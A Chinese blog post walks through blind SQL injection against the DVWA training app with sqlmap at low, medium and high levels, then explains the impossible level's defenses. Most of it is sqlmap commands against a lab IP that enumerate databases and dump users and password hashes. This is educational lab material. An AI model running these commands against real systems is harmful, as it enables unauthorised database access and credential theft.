+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124653.png" alt="4" loading="lazy"></p>
+<p>发现此为get型、id注入点为布尔)型盲注，并扫出了版本号</p>
+<p><strong>查询所有数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124655.png" alt="5" loading="lazy"></p>
+<p><strong>查询当前数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch --current-db</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124657.png" alt="6" loading="lazy"></p>
+<p><strong>列出数据库中的所有用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch --users</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124659.png" alt="7" loading="lazy"></p>
+<p><strong>获取Web应用当前所操作的用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch --current-user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124702.png" alt="8" loading="lazy"></p>
+<p><strong>列出可连接数据库的所有账户-对应的密码哈希</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch --passwords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124703.png" alt="10" loading="lazy"></p>
+<p><strong>列出指定数据库中的所有数据表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch -D dvwa –tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124706.png" alt="11" loading="lazy"></p>
+<p><strong>列出指定数据表中的所有字段（列）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124707.png" alt="12" loading="lazy"></p>
+<p><strong>导出指定数据表中的列字段进行保存</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low;PHPSESSID=ldopum46srn0q78qsnpkhnbgt4&quot; --batch -D dvwa -T users -C “user,password” –dump</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124709.png" alt="13" loading="lazy"></p>
+<h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><p>Low等级提交的数据是通过GET请求方式，直接在浏览器url中传递参数；而Medium等级，所提交的User ID数据是通过POST请求方式，参数是在POST请求体中传递。此时，构造SQLMap操作命令，需要将url和data分成两部分分别填写，同时需要更新Cookie信息的取值</p>
+<p>构造命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124712.png" alt="14" loading="lazy"></p>
+<p><strong>查询所有数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --dbs</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124714.png" alt="15" loading="lazy"></p>
+<p><strong>查询当前数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124716.png" alt="16" loading="lazy"></p>
+<p><strong>列出数据库中的所有用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --users</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124718.png" alt="17" loading="lazy"></p>
+<p><strong>获取Web应用当前所操作的用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --current-user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124721.png" alt="18" loading="lazy"></p>
+<p><strong>列出可连接数据库的所有账户-对应的密码哈希</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --passwords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124722.png" alt="19" loading="lazy"></p>
+<p><strong>列出指定数据库中的所有数据表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch -D dvwa –tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124725.png" alt="20" loading="lazy"></p>
+<p><strong>列出指定数据表中的所有字段（列）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124726.png" alt="21" loading="lazy"></p>
+<p><strong>导出指定数据表中的列字段进行保存</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --cookie=&quot;security=medium;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch -D dvwa -T users -C “user,password” –dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124728.png" alt="22" loading="lazy"></p>
+<h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><p>High级别的查询数据提交的页面，查询结果显示的页面分离成了2个不同的窗口分别控制的。即在查询提交窗口提交数据（POST请求）之后，需要到另外一个窗口进行查看结果（GET 请求）。若需获取请求体中的Form Data数据，则需要在提交数据的窗口中查看网络请求数据or通过拦截工具获取。<br>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没有办法进一步注入；但并不代表High级别不能使用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作。如：–second-url&#x3D;”xxxurl”(设置第二阶段响应的结果显示页面的url，旧版使用–second-order&#x3D;)</p>
+<p>构造命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124730.png" alt="23" loading="lazy"></p>
+<p><strong>查询所有数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --dbs</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124732.png" alt="24" loading="lazy"></p>
+<p><strong>查询当前数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124734.png" alt="25" loading="lazy"></p>
+<p><strong>列出数据库中的所有用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --users</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124736.png" alt="26" loading="lazy"></p>
+<p><strong>获取Web应用当前所操作的用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --current-user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124737.png" alt="27" loading="lazy"></p>
+<p><strong>列出可连接数据库的所有账户-对应的密码哈希</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch --passwords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124739.png" alt="28" loading="lazy"></p>
+<p><strong>列出指定数据库中的所有数据表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch -D dvwa –tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124741.png" alt="29" loading="lazy"></p>
+<p><strong>列出指定数据表中的所有字段（列）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124742.png" alt="30" loading="lazy"></p>
+<p><strong>导出指定数据表中的列字段进行保存</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --data=&quot;id=1&amp;Submit=Submit&quot; --second-url=&quot;192.168.224.135/dvwa/vulnerabilities/sqli_blind/&quot;  --cookie=&quot;security=high;PHPSESSID=dfqbsm7j4sopvt6p28jikahfj5&quot; --batch -D dvwa -T users -C “user,password” –dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/DVWA-%E7%9B%B2%E6%B3%A8/20220525124744.png" alt="31" loading="lazy"></p>
+<h4 id="lmpossible"><a href="#lmpossible" class="headerlink" title="lmpossible"></a>lmpossible</h4><p>impossible.php代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入</p>
+<p>只有当返回的查询结果数量为一个记录时，才会成功输出，这样就有效预防了暴库</p>
+<p>利用is_numeric($id)函数来判断输入的id是否是数字or数字字符串，满足条件才知晓query查询语句</p>
+<p>Anti-CSRF token机制的加入了进一步提高了安全性，session_token是随机生成的动态值，每次向服务器请求，客户端都会携带最新从服务端已下发的session_token值向服务器请求作匹配验证，相互匹配才会验证通过</p>
+<br>
+
+<p>部分参考来自：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ec2ca79e74b2">DVWA–SQL Injection(Blind)盲注–SQLMap测试过程解析</a></p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/2024%2F02%2F18%2F20240218151158.jpg"><img loading="lazy" src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/2024%2F02%2F18%2F20240218151158.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://s3.bmp.ovh/imgs/2022/03/1018089fdf3cd065.png"><img loading="lazy" src="https://s3.bmp.ovh/imgs/2022/03/1018089fdf3cd065.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://s3.bmp.ovh/imgs/2022/03/08ce21ed009e0f80.png"><img loading="lazy" src="https://s3.bmp.ovh/imgs/2022/03/08ce21ed009e0f80.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>LuRen</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://hexo.zhiyun.fun/posts/75e4ecec/" title="dvwa--盲注">http://hexo.zhiyun.fun/posts/75e4ecec/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul><script>document.addEventListener('copy', function (event) {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) { return; }
+  const text = window.getSelection().toString();
+  if (text) {
+    event.preventDefault();
+    clipboardData.setData('text/plain', text + '\n\n本文作者：LuRen\n本文链接：http://hexo.zhiyun.fun/posts/75e4ecec/\n版权声明：本博客所有文章除特别声明外，均默认采用 CC BY-NC-SA 4.0 许可协议。');
+  }
+});</script></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/3ba3be9/" rel="prev" title="Hexo版本升级指南"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Hexo版本升级指南</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/4b7a36ad/" rel="next" title="流程图(flowchart)语法学习"><span class="post-nav-text">流程图(flowchart)语法学习</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>不要与我交流，我什么都不会。</span><br><a class="hty-button hty-button--raised" id="github-discussions" target="_blank" rel="noopener" href="https://github.com/weaving-dreams/hexo.zhiyun.fun/discussions/new">GitHub Discussions</a></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/posts/75e4ecec/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2022 – 2025 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> LuRen</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2022-03-09T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
+}
+blog_live_time();
+</script></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script>function initMourn() {
+  const date = new Date();
+  const today = (date.getMonth() + 1) + "-" + date.getDate()
+  const mourn_days = ["4-4","9-18"]
+  if (mourn_days.includes(today)) {
+    document.documentElement.style.filter = "grayscale(1)";
+  }
+}
+initMourn();</script><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
